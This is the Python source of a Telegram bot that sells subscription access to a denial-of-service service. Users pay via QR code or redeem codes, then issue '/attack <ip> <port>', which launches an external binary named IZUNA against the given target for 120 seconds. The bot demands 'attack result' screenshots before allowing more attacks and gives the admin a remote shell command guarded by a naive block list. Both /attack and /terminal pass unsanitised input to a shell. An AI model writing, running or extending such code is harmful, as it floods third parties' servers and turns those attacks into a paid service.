import os
import io
import time
import asyncio
import random
import string
import logging
from datetime import datetime, timedelta, timezone

from pymongo import MongoClient
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    InputMediaPhoto,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# ----------------------------
# CONFIG - EDIT THESE VALUES
# ----------------------------
TELEGRAM_BOT_TOKEN = "YOUR_TOKEN_HERE"  # <--- put your bot token here
ADMIN_USER_ID = 5846326674             # <--- keep as your admin id
ADMIN_CHAT_ID = 5846326674             # admin chat (used to forward notifications)
ALLOWED_GROUP_ID = -1002382674139      # group id where /attack allowed for non-admin users
ALLOWED_GROUP_USERNAME = "@BADMOSH99"  # group username (for messages)
MONGO_URI = "mongodb://localhost:27017"  # change to your MongoDB URI if needed

# Default QR and price list images (used in plan flow)
QR_IMAGE_URL = "https://i.postimg.cc/Y2THkctN/Screenshot-20250214-152440-Fam-App.jpg"
PRICE_LIST_IMAGE_URL = "https://i.postimg.cc/ht6BXC8B/IMG-20250128-181501.jpg"

# ----------------------------
# Logging
# ----------------------------
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# ----------------------------
# DB Setup
# ----------------------------
client = MongoClient(MONGO_URI)
db = client["VAMPIRE_BOT"]
users_collection = db["users"]
redeem_codes_collection = db["redeem_codes"]

# ----------------------------
# Globals
# ----------------------------
# Running subprocesses for attacks, keyed by user_id
running_attacks: dict[int, asyncio.Process] = {}

# Per-user attack history: { user_id: (ip, port, duration) }
user_attack_history: dict[int, tuple] = {}

# Feedback required map: user must submit feedback screenshot to unlock attack again
user_feedback_required: dict[int, bool] = {}

# If user has sent /ss and is expected to upload a screenshot, track state in user_data
# We'll use ContextTypes.DEFAULT_TYPE.user_data for per-user ephemeral state.

# Screenshot anti-spam (optional)
user_screenshot_times: dict[int, float] = {}
user_wait_times: dict[int, int] = {}

# Global dynamic cooldown: when a non-admin attack starts, set cooldown_end_time = now + duration
current_global_cooldown = 0
cooldown_end_time = 0.0

# Terminal safe config
BLOCKED_COMMANDS = ["rm", "shutdown", "reboot", "kill", "sudo", "> ", ">>"]
current_directory = os.getcwd()
PROTECTED_FILES = ["bot.py", "raja.py"]

# ----------------------------
# Plans mapping: (name, price, duration_days)
# ----------------------------
PLANS = {
    "plan_1": ("Plan 1 - ₹150 (1 Day)", 150, 1),
    "plan_2": ("Plan 2 - ₹700 (7 Days)", 700, 7),
    "plan_3": ("Plan 3 - ₹2500 (30 Days)", 2500, 30),
}

# ----------------------------
# Helpers
# ----------------------------
def now_utc():
    return datetime.now(timezone.utc)

def user_has_access(user_id: int) -> bool:
    user = users_collection.find_one({"user_id": user_id})
    if not user:
        return False
    expiry = user.get("expiry_date")
    if not expiry:
        return False
    if expiry.tzinfo is None:
        expiry = expiry.replace(tzinfo=timezone.utc)
    return expiry > now_utc()

async def is_user_allowed(user_id: int) -> bool:
    # async wrapper
    return user_has_access(user_id)

def set_user_expiry(user_id: int, expiry_dt: datetime):
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"user_id": user_id, "expiry_date": expiry_dt}},
        upsert=True,
    )

# ----------------------------
# Bot commands and handlers
# ----------------------------

# /start — show plans
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if await is_user_allowed(user_id):
        await context.bot.send_message(chat_id, "✔️ You already have access! Use /help to see commands.")
        return

    keyboard = [
        [InlineKeyboardButton(PLANS["plan_1"][0], callback_data="plan_1")],
        [InlineKeyboardButton(PLANS["plan_2"][0], callback_data="plan_2")],
        [InlineKeyboardButton(PLANS["plan_3"][0], callback_data="plan_3")],
    ]
    await context.bot.send_message(
        chat_id,
        text="Choose a plan and follow instructions to pay. After payment use /ss to start screenshot flow.",
        reply_markup=InlineKeyboardMarkup(keyboard),
    )

# Callback when plan selected
async def handle_plan_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    plan_key = query.data
    plan_info = PLANS.get(plan_key)
    if not plan_info:
        await query.edit_message_text("Invalid plan selected.")
        return

    plan_name, price, days = plan_info
    await query.edit_message_text(f"You selected: {plan_name}\nPlease complete payment using the QR below and then send `/ss` to submit screenshot.")
    # send QR image
    await context.bot.send_photo(query.message.chat.id, QR_IMAGE_URL, caption=f"Pay ₹{price} for {plan_name.split('-',1)[0].strip()}")

# /price — show price list image
async def price_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_photo(update.effective_chat.id, PRICE_LIST_IMAGE_URL, caption="Price list")

# /ss — user indicates they will send screenshot next
async def ss_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    # only allow if user recently selected a plan — store selection in user_data
    if "selected_plan" not in context.user_data:
        # If user didn't select plan in this session, allow they may still have selected earlier
        # But to be strict, require selection to be in session. Simpler: if no selection, ask them to /start and pick.
        await context.bot.send_message(chat_id, "Please select a plan first using /start and press a plan button.")
        return

    # Mark state waiting for screenshot
    context.user_data["awaiting_payment_ss"] = True
    # optionally start anti-spam timers
    await context.bot.send_message(chat_id, "📸 Now send your payment screenshot. (Reply with the image. Don't forget.)\nStatus: Pending…")

# Photo handler for payment screenshot (when expecting)
async def payment_ss_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    # If user didn't run /ss, ignore or politely ask to use /ss
    if not context.user_data.get("awaiting_payment_ss", False):
        await context.bot.send_message(chat_id, "Please type /ss first before sending the payment screenshot.")
        return

    # get photo file (last)
    if not update.message.photo:
        await context.bot.send_message(chat_id, "Please send a photo (screenshot).")
        return

    photo = update.message.photo[-1]
    file = await photo.get_file()
    file_url = file.file_path  # Telegram file path (url-like)

    # store screenshot link and selected plan in DB or ephemeral user_data
    selected_plan = context.user_data.get("selected_plan", None)
    if not selected_plan:
        # fallback: ask to select plan
        await context.bot.send_message(chat_id, "Plan info missing. Please /start and select a plan, then try again.")
        context.user_data["awaiting_payment_ss"] = False
        return

    # Save a pending payment record in DB (optional)
    pending = {
        "user_id": user_id,
        "plan": selected_plan,
        "screenshot_url": file_url,
        "status": "pending",
        "created_at": now_utc(),
    }
    # store in a collection for records
    db.pending_payments = getattr(db, "pending_payments", db["pending_payments"])
    db.pending_payments.insert_one(pending)

    # forward to admin with inline approve/decline buttons plus plan info
    plan_name, price, days = PLANS[selected_plan]
    buttons = [
        [
            InlineKeyboardButton("✅ Approve", callback_data=f"approve|{user_id}|{selected_plan}"),
            InlineKeyboardButton("❌ Decline", callback_data=f"decline|{user_id}|{selected_plan}"),
        ]
    ]
    caption = (
        f"🔔 New payment request\n\n"
        f"User: `{user_id}`\n"
        f"Plan: *{plan_name}*\n"
        f"Price: ₹{price}\n"
        f"Validity: {days} day(s)\n\n"
        f"Use the buttons to Approve or Decline."
    )
    await context.bot.send_photo(ADMIN_CHAT_ID, file_url, caption=caption, reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown")

    # Inform user
    await context.bot.send_message(chat_id, "✅ Payment screenshot received and is pending admin approval.")
    context.user_data["awaiting_payment_ss"] = False

# Callback handler for Approve/Decline from admin
async def payment_approve_decline(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    # Only admin should act on these
    actor = query.from_user.id
    if actor != ADMIN_USER_ID:
        await query.edit_message_caption("❌ You are not authorized to approve/decline payments.")
        return

    data = query.data  # format approve|user_id|plan_key or decline|user_id|plan_key
    parts = data.split("|")
    if len(parts) != 3:
        await query.edit_message_text("Invalid action.")
        return

    action, user_id_s, plan_key = parts
    try:
        target_user_id = int(user_id_s)
    except ValueError:
        await query.edit_message_text("Invalid user id.")
        return

    plan_info = PLANS.get(plan_key)
    if not plan_info:
        await query.edit_message_text("Invalid plan.")
        return

    plan_name, price, days = plan_info

    if action == "approve":
        expiry = now_utc() + timedelta(days=days)
        set_user_expiry(target_user_id, expiry)

        # Update pending status (if stored)
        db.pending_payments.update_one({"user_id": target_user_id, "plan": plan_key, "status": "pending"},
                                       {"$set": {"status": "approved", "approved_at": now_utc()}})

        # notify admin and user
        await query.edit_message_caption(f"✅ Payment approved for user `{target_user_id}`.\nPlan: {plan_name}\nValid until {expiry}", parse_mode="Markdown")
        try:
            await context.bot.send_message(target_user_id, f"🎉 Your payment is approved! You now have access until {expiry} UTC.")
        except Exception:
            # if user has blocked bot or cannot be messaged, just ignore
            logger.warning(f"Could not send approval message to user {target_user_id}")

        # Clear feedback lock for them (if any) — they may attack now
        user_feedback_required.pop(target_user_id, None)

    elif action == "decline":
        db.pending_payments.update_one({"user_id": target_user_id, "plan": plan_key, "status": "pending"},
                                       {"$set": {"status": "declined", "declined_at": now_utc()}})
        await query.edit_message_caption(f"❌ Payment declined for user `{target_user_id}`.\nPlan: {plan_name}", parse_mode="Markdown")
        try:
            await context.bot.send_message(target_user_id, "❌ Your payment was declined by admin. Please try again or contact admin.")
        except Exception:
            logger.warning(f"Could not send decline message to user {target_user_id}")
    else:
        await query.edit_message_text("Unknown action.")

# /confirm <user_id> <duration> — admin quick confirm (manual)
async def confirm_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID:
        await context.bot.send_message(update.effective_chat.id, "❌ You are not authorized to use this.")
        return

    if len(context.args) < 2:
        await context.bot.send_message(update.effective_chat.id, "Usage: /confirm <user_id> <30d/10m>")
        return

    try:
        target_user_id = int(context.args[0])
    except ValueError:
        await context.bot.send_message(update.effective_chat.id, "Invalid user id.")
        return

    t = context.args[1]
    days = 0
    mins = 0
    if t.endswith("d"):
        days = int(t[:-1])
    elif t.endswith("m"):
        mins = int(t[:-1])
    else:
        await context.bot.send_message(update.effective_chat.id, "Duration must end with 'd' (days) or 'm' (minutes).")
        return

    expiry = now_utc() + timedelta(days=days, minutes=mins)
    set_user_expiry(target_user_id, expiry)
    await context.bot.send_message(update.effective_chat.id, f"✅ User {target_user_id} confirmed until {expiry}.")
    try:
        await context.bot.send_message(target_user_id, f"🎉 Your access is confirmed until {expiry} UTC.")
    except Exception:
        logger.warning(f"Could not notify user {target_user_id}")

# /gen <prefix> <num> <expiry> <max_uses>  e.g. /gen BADMOSH 10 2m 1
async def gen_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID:
        return await context.bot.send_message(update.effective_chat.id, "❌ Not authorized.")

    if len(context.args) < 3:
        return await context.bot.send_message(update.effective_chat.id, "Usage: /gen <prefix> <number> <expiry><d/m> [max_uses]")

    prefix = context.args[0]
    try:
        count = int(context.args[1])
    except ValueError:
        return await context.bot.send_message(update.effective_chat.id, "Invalid number of codes.")

    expiry_time = context.args[2]
    max_uses = int(context.args[3]) if len(context.args) > 3 else 1

    if expiry_time.endswith("d"):
        expiry_dt = now_utc() + timedelta(days=int(expiry_time[:-1]))
    elif expiry_time.endswith("m"):
        expiry_dt = now_utc() + timedelta(minutes=int(expiry_time[:-1]))
    else:
        return await context.bot.send_message(update.effective_chat.id, "Expiry must end with 'd' or 'm'.")

    codes = []
    for _ in range(count):
        suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        code = f"{prefix}-{suffix}"
        redeem_codes_collection.insert_one({
            "code": code,
            "expiry_date": expiry_dt,
            "used_by": [],
            "max_uses": max_uses,
            "redeem_count": 0,
        })
        codes.append(code)

    await context.bot.send_message(update.effective_chat.id, "Generated codes:\n" + "\n".join(codes))

# /redeem <code> for users
async def redeem_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        return await context.bot.send_message(update.effective_chat.id, "Usage: /redeem <code>")

    code = context.args[0].strip()
    entry = redeem_codes_collection.find_one({"code": code})
    if not entry:
        return await context.bot.send_message(update.effective_chat.id, "❌ Invalid code.")

    expiry_date = entry["expiry_date"]
    if expiry_date.tzinfo is None:
        expiry_date = expiry_date.replace(tzinfo=timezone.utc)
    if expiry_date <= now_utc():
        return await context.bot.send_message(update.effective_chat.id, "❌ This redeem code has expired.")

    if entry["redeem_count"] >= entry["max_uses"]:
        return await context.bot.send_message(update.effective_chat.id, "❌ This redeem code used maximum times.")

    if update.effective_user.id in entry.get("used_by", []):
        return await context.bot.send_message(update.effective_chat.id, "❌ You already used this code.")

    redeem_codes_collection.update_one({"code": code}, {"$inc": {"redeem_count": 1}, "$push": {"used_by": update.effective_user.id}})
    set_user_expiry(update.effective_user.id, expiry_date)
    await context.bot.send_message(update.effective_chat.id, "✅ Redeem applied. You have access now.")

# /users - list users (admin)
async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID:
        return await context.bot.send_message(update.effective_chat.id, "❌ Not authorized.")

    now = now_utc()
    users = users_collection.find()
    lines = []
    for u in users:
        uid = u.get("user_id")
        expiry = u.get("expiry_date")
        if expiry and expiry.tzinfo is None:
            expiry = expiry.replace(tzinfo=timezone.utc)
        if expiry:
            remaining = expiry - now
            if remaining.total_seconds() <= 0:
                status = "EXPIRED"
            else:
                days = remaining.days
                hours = remaining.seconds // 3600
                mins = (remaining.seconds // 60) % 60
                status = f"{days}d {hours}h {mins}m"
        else:
            status = "No expiry"
        lines.append(f"{uid} - {status}")
    if not lines:
        await context.bot.send_message(update.effective_chat.id, "No users.")
    else:
        await context.bot.send_message(update.effective_chat.id, "Users:\n" + "\n".join(lines))

# /remove <user_id> - admin remove
async def remove_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID:
        return await context.bot.send_message(update.effective_chat.id, "❌ Not authorized.")
    if len(context.args) != 1:
        return await context.bot.send_message(update.effective_chat.id, "Usage: /remove <user_id>")
    try:
        target = int(context.args[0])
    except ValueError:
        return await context.bot.send_message(update.effective_chat.id, "Invalid id.")
    users_collection.delete_one({"user_id": target})
    await context.bot.send_message(update.effective_chat.id, f"✅ Removed {target}")

# Terminal command (admin only, blocked commands filtered)
async def terminal_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID:
        return await context.bot.send_message(update.effective_chat.id, "❌ Not authorized.")

    if not context.args:
        return await context.bot.send_message(update.effective_chat.id, "Usage: /terminal <command>")

    command = " ".join(context.args)
    for blocked in BLOCKED_COMMANDS:
        if command.strip().startswith(blocked):
            return await context.bot.send_message(update.effective_chat.id, f"❌ Command '{blocked}' is blocked.")

    # allow cd separately
    global current_directory
    if command.startswith("cd "):
        target_dir = os.path.abspath(os.path.join(current_directory, command[3:].strip()))
        if os.path.isdir(target_dir):
            current_directory = target_dir
            return await context.bot.send_message(update.effective_chat.id, f"📂 Changed dir: {current_directory}")
        else:
            return await context.bot.send_message(update.effective_chat.id, f"❌ Directory not found: {target_dir}")

    try:
        proc = await asyncio.create_subprocess_shell(command, cwd=current_directory,
                                                    stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        stdout, stderr = await proc.communicate()
        output = (stdout + stderr).decode().strip()
        if not output:
            output = "No output."
        if len(output) > 4000:
            output = output[:4000] + "\n\n[Output truncated]"
        await context.bot.send_message(update.effective_chat.id, f"```\n{output}\n```", parse_mode="Markdown")
    except Exception as e:
        await context.bot.send_message(update.effective_chat.id, f"❌ Error: {e}")

# /upload (admin replies to a file with /upload to save it)
async def upload_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID:
        return await context.bot.send_message(update.effective_chat.id, "❌ Not authorized.")
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        return await context.bot.send_message(update.effective_chat.id, "⚠ Reply to a file with /upload to save it.")
    doc = update.message.reply_to_message.document
    filename = doc.file_name
    file_obj = await doc.get_file()
    local_path = os.path.join(current_directory, filename)
    await file_obj.download_to_drive(local_path)
    await context.bot.send_message(update.effective_chat.id, f"✅ File saved: {local_path}")

# /list <path>
async def list_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID:
        return await context.bot.send_message(update.effective_chat.id, "❌ Not authorized.")
    path = context.args[0] if context.args else current_directory
    if not os.path.isdir(path):
        return await context.bot.send_message(update.effective_chat.id, "Directory not found.")
    files = os.listdir(path)
    await context.bot.send_message(update.effective_chat.id, "Files:\n" + "\n".join(files) if files else "No files.")

# /delete <filename>
async def delete_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID:
        return await context.bot.send_message(update.effective_chat.id, "❌ Not authorized.")
    if len(context.args) != 1:
        return await context.bot.send_message(update.effective_chat.id, "Usage: /delete <filename>")
    filename = context.args[0]
    if filename in PROTECTED_FILES:
        return await context.bot.send_message(update.effective_chat.id, "⚠ Protected file. Cannot delete.")
    path = os.path.join(current_directory, filename)
    if not os.path.exists(path):
        return await context.bot.send_message(update.effective_chat.id, "File not found.")
    try:
        os.remove(path)
        await context.bot.send_message(update.effective_chat.id, f"✅ Deleted {filename}")
    except Exception as e:
        await context.bot.send_message(update.effective_chat.id, f"❌ Error deleting: {e}")

# /help
async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    base = (
        "/start - choose plan\n"
        "/price - see price list\n"
        "/ss - start payment screenshot flow\n"
        "/redeem <code> - redeem code\n"
        "/attack <ip> <port> - start attack (group only, admin anywhere)\n"
        "/stop - stop your running attack (CTRL+C style) and reset cooldown\n"
        "/feedback - submit attack result screenshot when requested\n"
        "/check - check your expiry\n"
    )
    admin_extra = (
        "\n\nAdmin commands:\n"
        "/confirm <user_id> <30d/10m> - manual confirm\n"
        "/gen <prefix> <n> <expiry><d/m> [max] - gen codes\n"
        "/users - list users\n"
        "/remove <user_id>\n"
        "/terminal <cmd> - run safe server command\n"
        "/upload (reply to file) - save file\n"
        "/list <path>\n"
        "/delete <filename>\n"
    )
    text = base + (admin_extra if uid == ADMIN_USER_ID else "")
    await context.bot.send_message(update.effective_chat.id, text)

# /check - user expiry and last attack info
async def check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    user = users_collection.find_one({"user_id": uid})
    if not user:
        return await context.bot.send_message(update.effective_chat.id, "❌ You have no active access.")
    expiry = user.get("expiry_date")
    if expiry and expiry.tzinfo is None:
        expiry = expiry.replace(tzinfo=timezone.utc)
    now = now_utc()
    remaining = expiry - now if expiry else None
    if remaining and remaining.total_seconds() > 0:
        rd = remaining.days
        rh = remaining.seconds // 3600
        rm = (remaining.seconds // 60) % 60
        rem_text = f"{rd}d {rh}h {rm}m"
    else:
        rem_text = "Expired or not set"
    last_attack = user_attack_history.get(uid, ("N/A", "N/A", "N/A"))
    await context.bot.send_message(update.effective_chat.id, f"Expiry: {rem_text}\nLast Attack: {last_attack}")

# ----------------------------
# ATTACK, RUN, STOP, FEEDBACK logic
# ----------------------------

# Attack command - locked to group for non-admins and checks dynamic global cooldown and feedback requirement
async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_global_cooldown, cooldown_end_time

    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    # if not admin and not in allowed group -> reject
    if user_id != ADMIN_USER_ID and chat_id != ALLOWED_GROUP_ID:
        return await context.bot.send_message(chat_id, f"⚠️ Attack command is locked. Use it only in our group:\n👉 {ALLOWED_GROUP_USERNAME}")

    # check permission (access)
    if not await is_user_allowed(user_id):
        return await context.bot.send_message(chat_id, "❌ You don't have access to use this command.")

    # feedback requirement: user must have submitted feedback for previous attack
    if user_feedback_required.get(user_id, False):
        return await context.bot.send_message(chat_id, "⚠️ You must submit attack feedback screenshot before using /attack again. Use /feedback to send it.")
        
            # global cooldown check (only applies to non-admins)
    now_ts = time.time()
    if user_id != ADMIN_USER_ID:
        if now_ts < cooldown_end_time:
            remaining = int(cooldown_end_time - now_ts)
            return await context.bot.send_message(chat_id, f"⏳ Global cooldown active: {remaining}s remaining. Please wait.")

    if len(context.args) != 2:
        return await context.bot.send_message(chat_id, "Usage: /attack <ip> <port>")

    ip = context.args[0]
    port = context.args[1]

    # For current design we use a default duration; you can change logic to accept duration arg
    duration = 120  # seconds; you can change or make dynamic

    # set user attack history and global cooldown (non-admins)
    user_attack_history[user_id] = (ip, port, duration)
    if user_id != ADMIN_USER_ID:
        current_global_cooldown = duration
        cooldown_end_time = now_ts + duration

    await context.bot.send_message(chat_id, f"💥 Attack started on {ip}:{port} for {duration}s\n⏳ Global cooldown activated for {duration}s")

    # spawn attack in background
    asyncio.create_task(run_attack(chat_id, user_id, ip, port, duration, context))

# Core runner: launches external process and manages running_attacks; when done, requires feedback
async def run_attack(chat_id: int, user_id: int, ip: str, port: str, duration: int, context: ContextTypes.DEFAULT_TYPE):
    global cooldown_end_time
    try:
        # Example command; adjust to your actual attack binary and args
        cmd = f"./IZUNA {ip} {port} {duration}"
        proc = await asyncio.create_subprocess_shell(cmd,
                                                    stdout=asyncio.subprocess.PIPE,
                                                    stderr=asyncio.subprocess.PIPE)
        running_attacks[user_id] = proc
        stdout, stderr = await proc.communicate()
        # Optionally log output
        if stdout:
            logger.info(f"Attack stdout for {user_id}: {stdout.decode(errors='ignore')}")
        if stderr:
            logger.info(f"Attack stderr for {user_id}: {stderr.decode(errors='ignore')}")
    except Exception as e:
        # On error, reset cooldown immediately
        logger.exception("Error running attack")
        cooldown_end_time = 0
        try:
            await context.bot.send_message(chat_id, f"❌ Attack failed to start: {e}")
        except Exception:
            pass
    finally:
        # cleanup
        running_attacks.pop(user_id, None)
        # Inform in chat
        try:
            await context.bot.send_message(chat_id, "✔ Attack finished.")
        except Exception:
            pass

        # require feedback screenshot for that user to unlock next attack
        user_feedback_required[user_id] = True
        try:
            await context.bot.send_message(chat_id, "📸 Please send attack result screenshot using /feedback to continue using /attack.")
        except Exception:
            pass

# /stop command: send SIGINT to user's running attack subprocess and reset cooldown
async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global cooldown_end_time
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    proc = running_attacks.get(user_id)
    if not proc:
        return await context.bot.send_message(chat_id, "❌ You have no active attack to stop.")

    try:
        # Send SIGINT (2) - behaves like Ctrl+C once
        proc.send_signal(2)
        # Reset global cooldown
        cooldown_end_time = 0
        await context.bot.send_message(chat_id, "🛑 Attack stopped (CTRL+C sent). Global cooldown reset.")
    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ Failed to stop attack: {e}")

# /feedback command: start feedback flow (expect screenshot next)
async def feedback_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    # Only allow if user actually needs to submit feedback
    if not user_feedback_required.get(user_id, False):
        return await context.bot.send_message(chat_id, "❌ You don't need to submit feedback currently.")

    context.user_data["awaiting_feedback_ss"] = True
    await context.bot.send_message(chat_id, "📸 Please send your attack screenshot now (upload the image).")

# Feedback screenshot handler
async def feedback_ss_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    if not context.user_data.get("awaiting_feedback_ss", False):
        # not currently awaiting feedback
        return

    if not update.message.photo:
        await context.bot.send_message(chat_id, "Please send a photo.")
        return

    photo = update.message.photo[-1]
    file = await photo.get_file()
    file_url = file.file_path

    # Forward to admin with user info
    await context.bot.send_message(ADMIN_CHAT_ID, f"📩 Attack feedback from {user_id}\nScreenshot below:")
    await context.bot.send_photo(ADMIN_CHAT_ID, file_url)

    # Clear awaiting state and unlock user
    context.user_data["awaiting_feedback_ss"] = False
    user_feedback_required[user_id] = False

    await context.bot.send_message(chat_id, "✔ Feedback received! You can now use /attack again.")

# ----------------------------
# Message handlers routing for photos (both payment and feedback)
# We'll route in a single photo handler that checks user_data flags.
# ----------------------------
async def photo_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # If user awaiting payment screenshot
    if context.user_data.get("awaiting_payment_ss", False):
        return await payment_ss_handler(update, context)
    # If user awaiting feedback screenshot
    if context.user_data.get("awaiting_feedback_ss", False):
        return await feedback_ss_handler(update, context)
    # else ignore or optionally save other photos
    await update.message.reply_text("If you want to submit payment screenshot use /ss or for attack feedback use /feedback.")

# ----------------------------
# Startup / main
# ----------------------------
def main():
    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    # Core user commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_plan_selection, pattern="^plan_"))
    app.add_handler(CommandHandler("price", price_cmd))
    app.add_handler(CommandHandler("ss", ss_cmd))
    app.add_handler(CommandHandler("redeem", redeem_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("check", check_cmd))

    # Attack / stop / feedback
    app.add_handler(CommandHandler("attack", attack_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("feedback", feedback_cmd))
    # photo router handles both payment ss and feedback ss depending on state
    app.add_handler(MessageHandler(filters.PHOTO, photo_router))

    # Admin management
    app.add_handler(CallbackQueryHandler(payment_approve_decline, pattern="^(approve|decline)\\|"))
    app.add_handler(CommandHandler("confirm", confirm_cmd))
    app.add_handler(CommandHandler("gen", gen_cmd))
    app.add_handler(CommandHandler("users", users_cmd))
    app.add_handler(CommandHandler("remove", remove_cmd))
    app.add_handler(CommandHandler("terminal", terminal_cmd))
    app.add_handler(CommandHandler("upload", upload_cmd))
    app.add_handler(CommandHandler("list", list_cmd))
    app.add_handler(CommandHandler("delete", delete_cmd))

    # Start
    logger.info("Bot starting...")
    app.run_polling()

if __name__ == "__main__":
    main()